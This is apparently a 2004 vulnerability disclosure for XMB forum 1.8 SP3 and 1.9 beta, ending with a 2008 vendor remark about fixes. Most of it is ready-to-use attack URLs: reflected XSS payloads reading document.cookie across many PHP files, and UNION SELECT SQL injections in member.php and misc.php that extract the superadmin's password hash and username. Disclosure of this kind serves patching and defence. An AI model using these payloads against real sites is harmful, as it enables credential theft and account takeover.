Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Extreme Messageboard aka XMB is very popular and feature rich forum,
based on php and mysql. More information can be found on sites
<http://www.aventure-media.co.uk> and <http://www.xmbforum.com>

Vulnerabilities:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ok, we have lot's of the security flaws to disclosure, so let's begin...

1. php and webserver info disclosure and possible XSS

Beginning with XMB 1.9 beta versions, file named phpinfo.php is shipped with forum
software. Original code:

<?php
/* $Id: phpinfo.php, v1.00 2003/10/11 10:45:18 Tularis Exp $ */
phpinfo();
?>

In this way ANYONE can get lot's of insider information from webserver and php engine
environment - good startup for attacker...
And even "better" - phpinfo.php can be used for exploiting the XSS:

<http://localhost/xmb19beta/phpinfo.php?foobar=&lt;script&gt;alert>(document.cookie);&lt;/script&gt;

2. XSS in xmb.php --> works in 1.8 SP3 and 1.9 beta

Example http request:

<http://localhost/xmb19beta/xmb.php?show=version&xmbuser=foobar>><body \
onload=alert(document.cookie);>

Remark: Log off before trying this or it will not work!

3. XSS in editprofile.php --> only in 1.9 beta

Example request:

<http://localhost/xmb19beta/editprofile.php?user=notexist_foobar&u2uheader=><body%20onload=alert(document.cookie);>

4. XSS in u2u.php --> works in 1.8 SP3 and 1.9 beta

Example request:

<http://localhost/xmb19beta/u2u.php?folder=foobar>"><body%20onload=alert(document.cookie);>

5. XSS in stats.php --> works in 1.8 SP3 and 1.9 beta

Reason --> uninitialized variables $viewmost,$replymost,$latest

<http://localhost/xmb19beta/stats.php?action=view&viewmost=>"></textarea><body%20onload=alert(document.cookie);>
 <http://localhost/xmb19beta/stats.php?action=view&replymost=>"></textarea><body%20onload=alert(document.cookie);>
 <http://localhost/xmb19beta/stats.php?action=view&latest=>"></textarea><body%20onload=alert(document.cookie);>

6. XSS in post.php

Reason --> uninitialized variables $message,$icons --> works in 1.8 SP3 and 1.9 beta

<http://localhost/xmb19beta/post.php?action=newthread&fid=1&message=>"></textarea><body%20onload=alert(document.cookie);>
 <http://localhost/xmb19beta/post.php?action=newthread&fid=1&icons=><body%20onload=alert(document.cookie);>

7. XSS in  forumdisplay.php --> works in 1.8 SP3 and 1.9 beta

Reason --> uninitialized variables \
$threadlist,$pagelinks,$forumlist,$navigation,$forumdisplay

<http://localhost/xmb19beta/forumdisplay.php?fid=1&threadlist=><body%20onload=alert(document.cookie);>
 <http://localhost/xmb19beta/forumdisplay.php?fid=1&pagelinks=><body%20onload=alert(document.cookie);>
 <http://localhost/xmb19beta/forumdisplay.php?fid=1&forumlist=><body%20onload=alert(document.cookie);>
 <http://localhost/xmb19beta/forumdisplay.php?fid=1&navigation=><body%20onload=alert(document.cookie);>
 <http://localhost/xmb19beta/forumdisplay.php?fid=1&forumdisplay=><body%20onload=alert(document.cookie);>

8. Sql injection and XSS in forumdisplay.php

<http://localhost/xmb19beta/forumdisplay.php?fid=1&tpp=><body%20onload=alert(document.cookie);>

Remark: will work only, when no user logged in, because logging in will override the \
$tpp value.

*************** [really scary sql injection bugs] ***************

9. sql injection and XSS in member.php --> only in 1.9 beta version

Let's look at original code, line 461:

switch($self['status']){
                case 'member';
                    $restrict .= " f.private !='3' AND";

                case 'Moderator';

                case 'Super Moderator';
                    $restrict .= " f.private != '2' AND";

                case 'Administrator';
                    $restrict .= " f.userlist = '' AND f.password = '' AND";

                case 'Super Administrator';
                    break;

                default:
                    $restrict .= " f.private !='3' AND f.private != '2' AND \
f.userlist = '' AND f.password = '' AND";  break;
            }
Hmm, $restrict is not initialized anywhere! So we can delivere here all what we want:
<http://localhost/xmb19beta/member.php?action=viewpro&member=waraxe&restrict=foobar>
You have an error in your SQL syntax.

XSS:

<http://localhost/xmb19beta/member.php?action=viewpro&member=waraxe&restrict=><body%20onload=alert(document.cookie);>

And now the funniest part - how to get superadmin's password's md5 hash from \
database:

<http://localhost/xmb19beta/member.php?action=viewpro&member=waraxe&restrict=%20f.priva> \
te=-99%20GROUP%20BY%20p.fid%20UNION%20SELECT%20password,null,99%20FROM%20xmb_members%20WHERE%20uid=1%20LIMIT%201%20/*

Or u want superadmin's username? Here it is:

<http://localhost/xmb19beta/member.php?action=viewpro&member=waraxe&restrict=%20f.priva> \
te=-99%20GROUP%20BY%20p.fid%20UNION%20SELECT%20username,null,99%20FROM%20xmb_members%20WHERE%20uid=1%20LIMIT%201%20/*

10. sql injection and XSS in misc.php --> only in 1.9 beta version

<http://localhost/xmb19beta/misc.php?action=search&restrict=><body%20onload=alert(document.cookie);>

<http://localhost/xmb19beta/misc.php?action=search&restrict=%20private=-99%20UNION%20SE> \
LECT%20null,null,password,null,null,null,null,null,null,null,null,null,null,null,null, \
null,null,null,null,null,null,null,null%20FROM%20xmb_members%20WHERE%20uid=1%20LIMIT%201%20/*

11. sql injection and XSS in today.php --> only in 1.9 beta version

<http://localhost/xmb19beta/today.php?restrict=><body%20onload=alert(document.cookie);>

Discussion:  Multiple exploits reported to Bugtraq in 2004 were evaluated by XMB staff in 2008. Of primary concern, the reported "XSS in post.php" had not been resolved and was still valid for one or more defects. The post.php file was reorganized in 2008 and released with version 1.9.10 to implement better I/O filtering. There were no hotfixes for old versions because the necessary changes were incompatible with existing customizations.
